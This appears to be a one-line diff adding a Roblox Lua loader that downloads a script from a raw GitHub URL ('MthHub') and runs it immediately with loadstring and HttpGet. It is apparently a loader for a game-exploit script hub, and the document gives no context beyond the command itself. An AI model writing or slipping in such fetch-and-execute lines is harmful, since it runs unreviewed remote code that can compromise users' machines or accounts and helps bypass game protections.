@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Mthhx/Mthhx/main/MthHub'),true))()
